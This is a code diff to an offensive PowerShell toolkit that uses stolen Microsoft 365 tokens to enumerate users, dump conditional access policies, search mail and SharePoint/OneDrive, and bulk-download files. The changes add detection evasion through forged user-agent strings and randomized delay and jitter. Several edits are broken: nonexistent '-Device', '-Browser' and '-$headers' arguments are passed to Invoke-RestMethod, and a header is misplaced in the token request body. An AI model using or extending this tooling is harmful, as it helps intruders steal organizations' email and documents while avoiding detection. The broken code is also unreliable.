@@ -818,24 +818,32 @@ function Invoke-ImmersiveFileReader{
         $FileID,
         [Parameter(Mandatory = $False)]
         [object[]]
-        $Tokens
-    )
-    if ($Device) {
-        if ($Browser) {
-            $UserAgent = Invoke-ForgeUserAgent -Device $Device -Browser $Browser
+        $Tokens,
+        [Parameter(Mandatory=$False)]
+        [ValidateSet('Mac','Windows','AndroidMobile','iPhone')]
+        [String]$Device,
+        [Parameter(Mandatory=$False)]
+        [ValidateSet('Android','IE','Chrome','Firefox','Edge','Safari')]
+        [String]$Browser
+        )
+        if ($Device) {
+            if ($Browser) {
+                $UserAgent = Invoke-ForgeUserAgent -Device $Device -Browser $Browser
+            }
+            else {
+                $UserAgent = Invoke-ForgeUserAgent -Device $Device
+            }
         }
         else {
-            $UserAgent = Invoke-ForgeUserAgent -Device $Device
+           if ($Browser) {
+                $UserAgent = Invoke-ForgeUserAgent -Browser $Browser 
+           } 
+           else {
+                $UserAgent = Invoke-ForgeUserAgent
+           }
         }
-    }
-    else {
-        if ($Browser) {
-            $UserAgent = Invoke-ForgeUserAgent -Browser $Browser 
-        } 
-        else {
-            $UserAgent = Invoke-ForgeUserAgent
-        }
-    }
+        $Headers=@{}
+        $Headers["User-Agent"] = $UserAgent
     if($Tokens){
         Write-Host -ForegroundColor yellow "[*] Using the provided access tokens."
     }
@@ -859,13 +867,10 @@ function Invoke-ImmersiveFileReader{
                 }
             }
     }
-
-    $Headers=@{}
-    $Headers["User-Agent"] = $UserAgent
     $Headers["Host"] = 'southcentralus1-mediap.svc.ms'
     $Headers["Accept-Language"] = "en-US"
     
-    Invoke-RefreshToSharePointToken -domain $SharePointDomain -ClientId "d326c1ce-6cc6-4de2-bebc-4591e5e13ef0" -Tokens $tokens
+    Invoke-RefreshToSharePointToken -domain $SharePointDomain -ClientId "d326c1ce-6cc6-4de2-bebc-4591e5e13ef0" -Tokens $tokens -Device $Device -Browser $Browser
    
     try {
         $request = Invoke-WebRequest -UseBasicParsing -Headers $Headers -Method GET -Uri "https://southcentralus1-mediap.svc.ms/transform/imreader?provider=spo&inputFormat=txt&cs=fFNQTw&docid=https%3A%2F%2F$($SharePointDomain)%3A443%2F_api%2Fv2.0%2Fdrives%2F$($DriveID)%2Fitems%2F$($FileID)%3Fversion%3DPublished&access_token=$($global:SharePointToken.access_token)&nocache=true"
@@ -2975,13 +2980,39 @@ Function Get-AzureADUsers{
     [Parameter(Position = 0, Mandatory = $true)]
     [object[]]
     $Tokens = "",
-    [Parameter(Position = 1, Mandatory = $true)]
+    [Parameter(Mandatory=$false)]
+    [string]$Resource = "https://graph.microsoft.com/",
+    [Parameter(Mandatory=$false)]
+    [ValidateSet('Mac','Windows','AndroidMobile','iPhone')]
+    [String]$Device = "Windows",
+    [Parameter(Mandatory=$false)]
+    [ValidateSet('Android','IE','Chrome','Firefox','Edge','Safari')]
+    [String]$Browser = "Edge",
+    [Parameter(Mandatory=$False)]
+    [String]$ClientID = "d3590ed6-52b3-4102-aeff-aad2292ab01c",  
+    [Parameter(Mandatory = $true)]
     [string]
-    $outfile = "",
+    $outfile = "AzureADUsers.log",
     [switch]
     $GraphRun
     )
     $access_token = $tokens.access_token
+    if ($Device) {
+		if ($Browser) {
+			$UserAgent = Invoke-ForgeUserAgent -Device $Device -Browser $Browser
+		}
+		else {
+			$UserAgent = Invoke-ForgeUserAgent -Device $Device
+		}
+	}
+	else {
+	   if ($Browser) {
+			$UserAgent = Invoke-ForgeUserAgent -Browser $Browser 
+	   } 
+	   else {
+			$UserAgent = Invoke-ForgeUserAgent
+	   }
+	}
     if(!$GraphRun){
     Write-Host "[*] Gathering the users from the tenant."
     }
@@ -2989,7 +3020,12 @@ Function Get-AzureADUsers{
     $userlist = @()
     do{
         try{
-		$request = Invoke-WebRequest -UseBasicParsing -Method GET -Uri $usersEndpoint -Headers @{"Authorization" = "Bearer $access_token"}
+            $Headers = @{
+                "Authorization" = "Bearer $access_token"
+                "User-Agent" = $UserAgent
+            }
+
+		    $request = Invoke-WebRequest -UseBasicParsing -Method GET -Uri $usersEndpoint -Headers $Headers
         }catch {
 		if($_.Exception.Response.StatusCode.value__ -match "429"){
                 Write-Host -ForegroundColor red "[*] Being throttled... sleeping 5 seconds"
@@ -3069,10 +3105,30 @@ Function Invoke-DumpCAPS{
     [object[]]
     $Tokens = "",
     [switch]
-    $GraphRun
-
+    $GraphRun,
+    [Parameter(Mandatory=$False)]
+    [ValidateSet('Mac','Windows','AndroidMobile','iPhone')]
+    [String]$Device,
+    [Parameter(Mandatory=$False)]
+    [ValidateSet('Android','IE','Chrome','Firefox','Edge','Safari')]
+    [String]$Browser
     )
-
+    if ($Device) {
+		if ($Browser) {
+			$UserAgent = Invoke-ForgeUserAgent -Device $Device -Browser $Browser
+		}
+		else {
+			$UserAgent = Invoke-ForgeUserAgent -Device $Device
+		}
+	}
+	else {
+	   if ($Browser) {
+			$UserAgent = Invoke-ForgeUserAgent -Browser $Browser 
+	   } 
+	   else {
+			$UserAgent = Invoke-ForgeUserAgent
+	   }
+	}
     if($Tokens){
         if(!$GraphRun){
         Write-Host -ForegroundColor yellow "[*] Using the provided access tokens."
@@ -3083,6 +3139,7 @@ Function Invoke-DumpCAPS{
         $refreshbody = @{
                 "resource" = "https://graph.windows.net/"
                 "client_id" =     "04b07795-8ddb-461a-bbee-02f9e1bf7b46"
+                "User-Agent" = $UserAgent
                 "grant_type" =    "refresh_token"
                 "refresh_token" = $RefreshToken
                 "scope"=         "openid"
@@ -3109,7 +3166,6 @@ Function Invoke-DumpCAPS{
             "client_id" =     "04b07795-8ddb-461a-bbee-02f9e1bf7b46"
             "resource" =      "https://graph.windows.net/"
         }
-        $UserAgent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
         $Headers=@{}
         $Headers["User-Agent"] = $UserAgent
         $authResponse = Invoke-RestMethod `
@@ -3156,6 +3212,7 @@ Function Invoke-DumpCAPS{
 
     $HeadersAuth = @{
         Authorization = "Bearer $access_token"
+        "User-Agent" = $UserAgent
     }
 
     $CAPSUrl = "https://graph.windows.net/$tenantid/policies?api-version=1.61-internal"
@@ -4806,11 +4863,37 @@ function Invoke-GraphRecon{
         [Parameter(Position = 0, Mandatory = $False)]
         [object[]]
         $Tokens = "",
+        [Parameter(Mandatory=$false)]
+        [string]$Resource = "https://graph.microsoft.com/",
+        [Parameter(Mandatory=$False)]
+        [ValidateSet('Mac','Windows','AndroidMobile','iPhone')]
+        [String]$Device,
+        [Parameter(Mandatory=$False)]
+        [ValidateSet('Android','IE','Chrome','Firefox','Edge','Safari')]
+        [String]$Browser,
+        [Parameter(Mandatory=$False)]
+        [String]$ClientID = "d3590ed6-52b3-4102-aeff-aad2292ab01c",
         [switch]
         $GraphRun,
         [switch]
         $PermissionEnum
     )
+    if ($Device) {
+		if ($Browser) {
+			$UserAgent = Invoke-ForgeUserAgent -Device $Device -Browser $Browser
+		}
+		else {
+			$UserAgent = Invoke-ForgeUserAgent -Device $Device
+		}
+	}
+	else {
+	   if ($Browser) {
+			$UserAgent = Invoke-ForgeUserAgent -Browser $Browser 
+	   } 
+	   else {
+			$UserAgent = Invoke-ForgeUserAgent
+	   }
+	}
     if($Tokens){
         if(!$GraphRun){
             Write-Host -ForegroundColor yellow "[*] Using the provided access tokens."
@@ -6270,9 +6353,30 @@ function Invoke-SearchSharePointAndOneDrive{
     [switch]
     $PageResults,
     [switch]
-    $GraphRun
+    $GraphRun,
+    [Parameter(Mandatory=$False)]
+    [ValidateSet('Mac','Windows','AndroidMobile','iPhone')]
+    [String]$Device,
+    [Parameter(Mandatory=$False)]
+    [ValidateSet('Android','IE','Chrome','Firefox','Edge','Safari')]
+    [String]$Browser
     )
-
+    if ($Device) {
+		if ($Browser) {
+			$UserAgent = Invoke-ForgeUserAgent -Device $Device -Browser $Browser
+		}
+		else {
+			$UserAgent = Invoke-ForgeUserAgent -Device $Device
+		}
+	}
+	else {
+	   if ($Browser) {
+			$UserAgent = Invoke-ForgeUserAgent -Browser $Browser 
+	   } 
+	   else {
+			$UserAgent = Invoke-ForgeUserAgent
+	   }
+	}
     if($Tokens){
         #Suppressing output if GraphRun module is used
         if (!$GraphRun){
@@ -6308,6 +6412,7 @@ function Invoke-SearchSharePointAndOneDrive{
     $headers = @{
     "Authorization" = "Bearer $access_token"
     "Content-Type" = "application/json"
+    "User-Agent" = $UserAgent
     }
 
     # Define the search query
@@ -6422,7 +6527,7 @@ function Invoke-SearchSharePointAndOneDrive{
                     $resultstodl = $resulttodownload.split(",")
                     foreach ($res in $resultstodl){
                         $specificfileinfo = $resultarray[$res]
-                        Invoke-DriveFileDownload -Tokens $tokens -DriveItemIDs $specificfileinfo.driveitemids -FileName $specificfileinfo.filename
+                        Invoke-DriveFileDownload -Tokens $tokens -DriveItemIDs $specificfileinfo.driveitemids -FileName $specificfileinfo.filename -Device $Device -Browser $Browser -$headers
                     }
                 } elseif ($anotherDownload -eq "no" -or $anotherDownload -eq "n") {
                     Write-Output "[*] Quitting..."
@@ -6432,7 +6537,7 @@ function Invoke-SearchSharePointAndOneDrive{
                     Write-Host -ForegroundColor Cyan '[***] WARNING - Downloading ALL' + $itemnumber 'matches.'
                         for ($res=0; $res -lt $itemnumber; $res++){
                             $specificfileinfo = $resultarray[$res]
-                            Invoke-DriveFileDownload -Tokens $tokens -DriveItemIDs $specificfileinfo.driveitemids -FileName $specificfileinfo.filename
+                            Invoke-DriveFileDownload -Tokens $tokens -DriveItemIDs $specificfileinfo.driveitemids -FileName $specificfileinfo.filename -Device $Device -Browser $Browser -$headers
                         }
                 } else {
                     Write-Output "Invalid input. Please enter Yes or No."
@@ -6449,7 +6554,7 @@ function Invoke-SearchSharePointAndOneDrive{
                     $resultstodl = $resulttodownload.split(",")
                     foreach ($res in $resultstodl){
                         $specificfileinfo = $resultarray[$res]
-                        Invoke-DriveFileDownload -Tokens $tokens -DriveItemIDs $specificfileinfo.driveitemids -FileName $specificfileinfo.filename
+                        Invoke-DriveFileDownload -Tokens $tokens -DriveItemIDs $specificfileinfo.driveitemids -FileName $specificfileinfo.filename -Device $Device -Browser $Browser -$headers
                     }
                 } elseif ($answer -eq "no" -or $answer -eq "n") {
                     Write-Output "[*] Quitting..."
@@ -6461,7 +6566,7 @@ function Invoke-SearchSharePointAndOneDrive{
                     Write-Host -ForegroundColor Cyan '[***] WARNING - Downloading ALL' + $itemnumber 'matches.'
                         for ($res=0; $res -lt $itemnumber; $res++){
                             $specificfileinfo = $resultarray[$res]
-                            Invoke-DriveFileDownload -Tokens $tokens -DriveItemIDs $specificfileinfo.driveitemids -FileName $specificfileinfo.filename
+                            Invoke-DriveFileDownload -Tokens $tokens -DriveItemIDs $specificfileinfo.driveitemids -FileName $specificfileinfo.filename -Device $Device -Browser $Browser -$headers
                         }
                 } else {
                     Write-Output "Invalid input. Please enter Yes or No."
@@ -6513,16 +6618,39 @@ function Invoke-DriveFileDownload{
     $DriveItemIDs = "",
     [Parameter(Position = 2, Mandatory = $true)]
     [string]
-    $FileName = ""
+    $FileName = "",
+    [Parameter(Mandatory=$False)]
+    [ValidateSet('Mac','Windows','AndroidMobile','iPhone')]
+    [String]$Device,
+    [Parameter(Mandatory=$False)]
+    [ValidateSet('Android','IE','Chrome','Firefox','Edge','Safari')]
+    [String]$Browser
     )
+    if ($Device) {
+		if ($Browser) {
+			$UserAgent = Invoke-ForgeUserAgent -Device $Device -Browser $Browser
+		}
+		else {
+			$UserAgent = Invoke-ForgeUserAgent -Device $Device
+		}
+	}
+	else {
+	   if ($Browser) {
+			$UserAgent = Invoke-ForgeUserAgent -Browser $Browser 
+	   } 
+	   else {
+			$UserAgent = Invoke-ForgeUserAgent
+	   }
+	}
     $access_token = $tokens.access_token
     $itemarray = $driveitemids.split(":")
     $downloadUrl = ("https://graph.microsoft.com/v1.0/drives/" + $itemarray[0] + "/items/" + $itemarray[1] + "/content")
     $downloadheaders = @{
     "Authorization" = "Bearer $access_token"
+    "User-Agent" = $UserAgent
     }
     Write-Host -ForegroundColor yellow "[*] Now downloading $FileName"
-    Invoke-RestMethod -Uri $downloadUrl -Headers $downloadheaders -OutFile $filename
+    Invoke-RestMethod -Uri $downloadUrl -Headers $downloadheaders -OutFile $filename -Device $Device -Browser $Browser -$headers
 }
 
 
@@ -6920,18 +7048,70 @@ function Invoke-GraphRunner{
 
         A json file containing KQL queries. See the default_detectors.json file in the repo as an example.
 
+    .PARAMETER Resource
+        Specifies the Microsoft Graph resource URL. Default is "https://graph.microsoft.com/".
+
+    .PARAMETER Device
+        Indicates the device type for user agent string. Options are: Mac, Windows, AndroidMobile, iPhone. Default is Windows.
+
+    .PARAMETER Browser
+        Specifies the browser type for user agent string. Options include: Android, IE, Chrome, Firefox, Edge, Safari. Default is Edge.
+
+    .PARAMETER ClientID
+        The Client ID for authentication. Default is set to "d3590ed6-52b3-4102-aeff-aad2292ab01c".
+
+    .PARAMETER DisableRecon
+        If set, disables Graph Reconnaissance.
+
+    .PARAMETER DisableUsers
+        If set, disables Azure AD user enumeration.
+
+    .PARAMETER DisableGroups
+        If set, disables security group enumeration.
+
+    .PARAMETER DisableCAPS
+        If set, disables CAPS data dumping.
+
+    .PARAMETER DisableApps
+        If set, disables application enumeration.
+
+    .PARAMETER DisableEmail
+        If set, disables email search.
+
+    .PARAMETER DisableSharePoint
+        If set, disables SharePoint and OneDrive search.
+
+    .PARAMETER DisableTeams
+        If set, disables Teams search.
+
+    .PARAMETER Delay
+        Adds a delay between operations in milliseconds. Valid range is 0-10000.
+        Code from PowerShell Empire :)
+
+    .PARAMETER Jitter
+        Adds variability to the delay. Must be between 0.0 and 1.0.
+        Code from PowerShell Empire :)
+
     .EXAMPLE
-        
         C:\PS> Invoke-GraphRunner -Tokens $tokens
         -----------
         Runs through the account with many of the enumeration and pillage modules using the default_detectors.json file.
-    #>
-
+#>
     param(
     [Parameter(Position = 0, Mandatory = $false)]
     [object[]]
     $Tokens = "",
-    [Parameter(Position = 1, Mandatory = $false)]
+    [Parameter(Mandatory=$false)]
+    [string]$Resource = "https://graph.microsoft.com/",
+    [Parameter(Mandatory=$False)]
+    [ValidateSet('Mac','Windows','AndroidMobile','iPhone')]
+    [String]$Device = "Windows",
+    [Parameter(Mandatory=$False)]
+    [ValidateSet('Android','IE','Chrome','Firefox','Edge','Safari')]
+    [String]$Browser = "Edge",
+    [Parameter(Mandatory=$False)]
+    [String]$ClientID = "d3590ed6-52b3-4102-aeff-aad2292ab01c",
+    [Parameter(Mandatory = $false)]
     [string]
     $DetectorFile = ".\default_detectors.json",
     [switch]
@@ -6949,9 +7129,14 @@ function Invoke-GraphRunner{
     [switch]
     $DisableSharePoint,
     [switch]
-    $DisableTeams
+    $DisableTeams,
+    [ValidateRange(0,10000)]
+    [Int]
+    $Delay = 0,
+    [ValidateRange(0.0, 1.0)]
+    [Double]
+    $Jitter = .3
     )
-    
     if($Tokens){
         Write-Host -ForegroundColor yellow "[*] Using the provided access tokens."
     }
@@ -6987,33 +7172,138 @@ function Invoke-GraphRunner{
     # GraphRecon
     if(!$DisableRecon){
         Write-Host -ForegroundColor yellow "[*] Now running Invoke-GraphRecon."
-        Invoke-GraphRecon -Tokens $tokens -GraphRun | Out-File -Encoding ascii "$folderName\recon.txt"
+        Invoke-GraphRecon -Tokens $tokens -ClientID $ClientID -Device $Device -Browser $Browser -GraphRun | Out-File -Encoding ascii "$folderName\recon.txt"
+    }
+    # Calculate the minimum sleep time
+    $minDelay = $Delay * (1 - $Jitter)
+    if ($minDelay -lt 0) { $minDelay = 0 }
+
+    # Calculate the maximum sleep time
+    $maxDelay = $Delay * (1 + $Jitter)
+
+    # If maxDelay is less than or equal to minDelay, we need to ensure some jitter
+    if ($maxDelay -le $minDelay) {
+        $maxDelay = $minDelay + 1
     }
 
+    # Use integer values for sleep time in seconds
+    $minDelay = [Math]::Floor($minDelay)
+    $maxDelay = [Math]::Ceiling($maxDelay)
+
+    # Generate a random number within this range
+    $RandNo = New-Object System.Random
+    $SleepyTime = $RandNo.Next($minDelay, $maxDelay + 1)
+
+    Write-Output "Sleeping for $SleepyTime seconds."
+    Start-Sleep -Seconds $SleepyTime
     # Users
     if(!$DisableUsers){
         Write-Host -ForegroundColor yellow "[*] Now getting all users"
-        Get-AzureADUsers -Tokens $tokens -GraphRun -outfile "$folderName\users.txt"
+        Get-AzureADUsers -Tokens $tokens -ClientID $ClientID -Device $Device -Browser $Browser -GraphRun -outfile "$folderName\users.txt"
+    }
+    # Calculate the minimum sleep time
+    $minDelay = $Delay * (1 - $Jitter)
+    if ($minDelay -lt 0) { $minDelay = 0 }
+
+    # Calculate the maximum sleep time
+    $maxDelay = $Delay * (1 + $Jitter)
+
+    # If maxDelay is less than or equal to minDelay, we need to ensure some jitter
+    if ($maxDelay -le $minDelay) {
+        $maxDelay = $minDelay + 1
     }
 
+    # Use integer values for sleep time in seconds
+    $minDelay = [Math]::Floor($minDelay)
+    $maxDelay = [Math]::Ceiling($maxDelay)
+
+    # Generate a random number within this range
+    $RandNo = New-Object System.Random
+    $SleepyTime = $RandNo.Next($minDelay, $maxDelay + 1)
+
+    Write-Output "Sleeping for $SleepyTime seconds."
+    Start-Sleep -Seconds $SleepyTime
     # Groups
     if(!$DisableGroups){
         Write-Host -ForegroundColor yellow "[*] Now getting all groups"
-        Get-SecurityGroups -Tokens $tokens -GraphRun | Out-File -Encoding ascii "$folderName\groups.txt"
+        Get-SecurityGroups -Tokens $tokens -ClientID $ClientID -Device $Device -Browser $Browser -GraphRun | Out-File -Encoding ascii "$folderName\groups.txt"
+    }
+    # Calculate the minimum sleep time
+    $minDelay = $Delay * (1 - $Jitter)
+    if ($minDelay -lt 0) { $minDelay = 0 }
+
+    # Calculate the maximum sleep time
+    $maxDelay = $Delay * (1 + $Jitter)
+
+    # If maxDelay is less than or equal to minDelay, we need to ensure some jitter
+    if ($maxDelay -le $minDelay) {
+        $maxDelay = $minDelay + 1
     }
 
+    # Use integer values for sleep time in seconds
+    $minDelay = [Math]::Floor($minDelay)
+    $maxDelay = [Math]::Ceiling($maxDelay)
+
+    # Generate a random number within this range
+    $RandNo = New-Object System.Random
+    $SleepyTime = $RandNo.Next($minDelay, $maxDelay + 1)
+
+    Write-Output "Sleeping for $SleepyTime seconds."
+    Start-Sleep -Seconds $SleepyTime
     # CAPS
     if(!$DisableCAPS){
         Write-Host -ForegroundColor yellow "[*] Now getting conditional access policies"
         Invoke-DumpCAPS -Tokens $tokens -ResolveGuids -GraphRun | Out-File -Encoding ascii "$folderName\caps.txt"
     }
+    # Calculate the minimum sleep time
+    $minDelay = $Delay * (1 - $Jitter)
+    if ($minDelay -lt 0) { $minDelay = 0 }
 
-    # Apps
-    if(!$DisableApps){
-        Write-Host -ForegroundColor yellow "[*] Now getting applications"
-        Invoke-DumpApps -Tokens $tokens -GraphRun | Out-File -Encoding ascii "$foldername\apps.txt"
+    # Calculate the maximum sleep time
+    $maxDelay = $Delay * (1 + $Jitter)
+
+    # If maxDelay is less than or equal to minDelay, we need to ensure some jitter
+    if ($maxDelay -le $minDelay) {
+        $maxDelay = $minDelay + 1
     }
 
+    # Use integer values for sleep time in seconds
+    $minDelay = [Math]::Floor($minDelay)
+    $maxDelay = [Math]::Ceiling($maxDelay)
+
+    # Generate a random number within this range
+    $RandNo = New-Object System.Random
+    $SleepyTime = $RandNo.Next($minDelay, $maxDelay + 1)
+
+    Write-Output "Sleeping for $SleepyTime seconds."
+    Start-Sleep -Seconds $SleepyTime
+    # Apps
+    if(!$DisableApps){
+    Write-Host -ForegroundColor yellow "[*] Now getting applications"
+    Invoke-DumpApps -Tokens $tokens -GraphRun | Out-File -Encoding ascii "$foldername\apps.txt"
+}
+    # Calculate the minimum sleep time
+    $minDelay = $Delay * (1 - $Jitter)
+    if ($minDelay -lt 0) { $minDelay = 0 }
+
+    # Calculate the maximum sleep time
+    $maxDelay = $Delay * (1 + $Jitter)
+
+    # If maxDelay is less than or equal to minDelay, we need to ensure some jitter
+    if ($maxDelay -le $minDelay) {
+        $maxDelay = $minDelay + 1
+    }
+
+    # Use integer values for sleep time in seconds
+    $minDelay = [Math]::Floor($minDelay)
+    $maxDelay = [Math]::Ceiling($maxDelay)
+
+    # Generate a random number within this range
+    $RandNo = New-Object System.Random
+    $SleepyTime = $RandNo.Next($minDelay, $maxDelay + 1)
+
+    Write-Output "Sleeping for $SleepyTime seconds."
+    Start-Sleep -Seconds $SleepyTime
     # Email
     if(!$DisableEmail){
         $mailout = "$folderName\interesting-mail.csv"
@@ -7023,7 +7313,28 @@ function Invoke-GraphRunner{
             Invoke-SearchMailbox -Tokens $tokens -SearchTerm $detect.SearchQuery -DetectorName $detect.DetectorName -MessageCount 500 -OutFile $mailout -GraphRun -PageResults
         }
     }
-    
+    # Calculate the minimum sleep time
+    $minDelay = $Delay * (1 - $Jitter)
+    if ($minDelay -lt 0) { $minDelay = 0 }
+
+    # Calculate the maximum sleep time
+    $maxDelay = $Delay * (1 + $Jitter)
+
+    # If maxDelay is less than or equal to minDelay, we need to ensure some jitter
+    if ($maxDelay -le $minDelay) {
+        $maxDelay = $minDelay + 1
+    }
+
+    # Use integer values for sleep time in seconds
+    $minDelay = [Math]::Floor($minDelay)
+    $maxDelay = [Math]::Ceiling($maxDelay)
+
+    # Generate a random number within this range
+    $RandNo = New-Object System.Random
+    $SleepyTime = $RandNo.Next($minDelay, $maxDelay + 1)
+
+    Write-Output "Sleeping for $SleepyTime seconds."
+    Start-Sleep -Seconds $SleepyTime
     # SharePoint and OneDrive Tests
     if(!$DisableSharePoint){
         $spout = "$folderName\interesting-files.csv"
@@ -7033,7 +7344,28 @@ function Invoke-GraphRunner{
             Invoke-SearchSharePointAndOneDrive  -Tokens $tokens -SearchTerm $detect.SearchQuery -DetectorName $detect.DetectorName -PageResults -ResultCount 500 -ReportOnly -OutFile $spout -GraphRun
         }
     }
-    
+    # Calculate the minimum sleep time
+    $minDelay = $Delay * (1 - $Jitter)
+    if ($minDelay -lt 0) { $minDelay = 0 }
+
+    # Calculate the maximum sleep time
+    $maxDelay = $Delay * (1 + $Jitter)
+
+    # If maxDelay is less than or equal to minDelay, we need to ensure some jitter
+    if ($maxDelay -le $minDelay) {
+        $maxDelay = $minDelay + 1
+    }
+
+    # Use integer values for sleep time in seconds
+    $minDelay = [Math]::Floor($minDelay)
+    $maxDelay = [Math]::Ceiling($maxDelay)
+
+    # Generate a random number within this range
+    $RandNo = New-Object System.Random
+    $SleepyTime = $RandNo.Next($minDelay, $maxDelay + 1)
+
+    Write-Output "Sleeping for $SleepyTime seconds."
+    Start-Sleep -Seconds $SleepyTime
     # Teams
     if(!$DisableTeams){
         $teamsout = "$folderName\interesting-teamsmessages.csv"
